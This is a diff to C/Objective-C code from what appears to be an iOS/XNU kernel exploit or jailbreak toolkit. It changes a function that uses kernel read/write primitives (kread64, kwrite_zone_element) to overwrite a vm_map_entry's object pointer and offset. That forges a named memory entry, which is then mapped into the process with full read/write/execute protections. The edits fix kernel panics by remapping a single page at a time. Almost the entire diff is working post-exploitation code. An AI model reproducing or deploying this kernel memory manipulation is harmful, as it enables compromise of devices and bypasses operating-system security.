@@ -198,23 +198,35 @@ static struct VMShmem vm_create_shmem_with_object_locked(struct VMObject *object
         return shmem;
     }
 
-    uint64_t size = kread64(object->address + off_vm_object_vo_un1_vou_size);
-    size = mach_vm_round_page(size);
-    uint64_t roundedSize = mach_vm_round_page(size);
+    // Single-page remap (Cyanide/Fl0rk page cache):
+    // named entry is ONE page; vme_offset points at that page in the target
+    // object; mach_vm_map uses offset 0. Mapping full-object size + entryOffset
+    // caused panic: vm_page_insert_internal offset past object bounds
+    // (e.g. off=0x11cc000 into object size=0x4000).
+    uint64_t pageObjectOffset = object->entryOffset & ~PAGE_MASK_K;
+    uint64_t objectSize = kread64(object->address + off_vm_object_vo_un1_vou_size);
+    if (objectSize && pageObjectOffset >= objectSize) {
+        printf("[DS][%s:%d] page offset 0x%llx past object size 0x%llx addr=0x%llx\n",
+               __FUNCTION__, __LINE__,
+               (unsigned long long)pageObjectOffset,
+               (unsigned long long)objectSize,
+               (unsigned long long)object->vmAddress);
+        return shmem;
+    }
 
     mach_vm_address_t localAddr = 0;
-    kern_return_t ret = mach_vm_allocate(mach_task_self_, &localAddr, roundedSize, VM_FLAGS_ANYWHERE);
+    kern_return_t ret = mach_vm_allocate(mach_task_self_, &localAddr, PAGE_SIZE, VM_FLAGS_ANYWHERE);
     if (ret != KERN_SUCCESS) {
         printf("[DS][%s:%d] mach_vm_allocate failed: %s\n", __FUNCTION__, __LINE__, mach_error_string(ret));
         return shmem;
     }
 
     mach_port_t memoryObject = MACH_PORT_NULL;
-    memory_object_size_t entrySize = roundedSize;
+    memory_object_size_t entrySize = PAGE_SIZE;
     ret = mach_make_memory_entry_64(mach_task_self_, &entrySize, (memory_object_offset_t)localAddr, VM_PROT_READ | VM_PROT_WRITE, &memoryObject, MACH_PORT_NULL);
     if (ret != KERN_SUCCESS) {
         printf("[DS][%s:%d] mach_make_memory_entry_64 failed: %s\n", __FUNCTION__, __LINE__, mach_error_string(ret));
-        mach_vm_deallocate(mach_task_self_, localAddr, roundedSize);
+        mach_vm_deallocate(mach_task_self_, localAddr, PAGE_SIZE);
         return shmem;
     }
 
@@ -230,7 +242,7 @@ static struct VMShmem vm_create_shmem_with_object_locked(struct VMObject *object
                __FUNCTION__, __LINE__,
                (unsigned long long)object->vmAddress,
                (int)entry.is_sub_map, (int)entry.vme_kernel_object);
-        mach_vm_deallocate(mach_task_self_, localAddr, roundedSize);
+        mach_vm_deallocate(mach_task_self_, localAddr, PAGE_SIZE);
         if (MACH_PORT_VALID(memoryObject)) {
             mach_port_deallocate(mach_task_self_, memoryObject);
         }
@@ -250,9 +262,9 @@ static struct VMShmem vm_create_shmem_with_object_locked(struct VMObject *object
     BOOL bumpedRef = YES;
 
     entry.vme_object_or_delta = (uint32_t)packedPointer;
-    // XNU stores vme_offset as page number (bytes >> PAGE_SHIFT).
-    // object->objectOffset is already byte-expanded via VME_OFFSET(); pack it back.
-    entry.vme_offset = object->objectOffset >> 12;
+    // XNU stores vme_offset as page number. Point named entry at THIS page
+    // inside the target object — not the map-entry base (objectOffset).
+    entry.vme_offset = pageObjectOffset >> 12;
 
     // Exclusive: concurrent kwrite_zone_element raced XNU RW lock → panic.
     kwrite_zone_element(nextAddr, &entry, sizeof(struct vm_map_entry));
@@ -261,9 +273,10 @@ static struct VMShmem vm_create_shmem_with_object_locked(struct VMObject *object
     vm_prot_t curProt = VM_PROT_ALL | VM_PROT_IS_MASK;
     vm_prot_t maxProt = VM_PROT_ALL | VM_PROT_IS_MASK;
 
+    // Named entry is one page → map offset must be 0.
     ret = mach_vm_map(mach_task_self_, &mappedAddr, PAGE_SIZE, 0,
                        VM_FLAGS_ANYWHERE, memoryObject,
-                       (memory_object_offset_t)object->entryOffset,
+                       0,
                        FALSE, curProt, maxProt, VM_INHERIT_NONE);
     if (ret != KERN_SUCCESS) {
         printf("[DS][%s:%d] mach_vm_map failed: %s\n", __FUNCTION__, __LINE__, mach_error_string(ret));
@@ -282,7 +295,7 @@ static struct VMShmem vm_create_shmem_with_object_locked(struct VMObject *object
     }
     (void)bumpedRef;
 
-    ret = mach_vm_deallocate(mach_task_self_, localAddr, roundedSize);
+    ret = mach_vm_deallocate(mach_task_self_, localAddr, PAGE_SIZE);
     if (ret != KERN_SUCCESS)
         printf("[DS][%s:%d] mach_vm_deallocate failed: %s\n", __FUNCTION__, __LINE__, mach_error_string(ret));
 
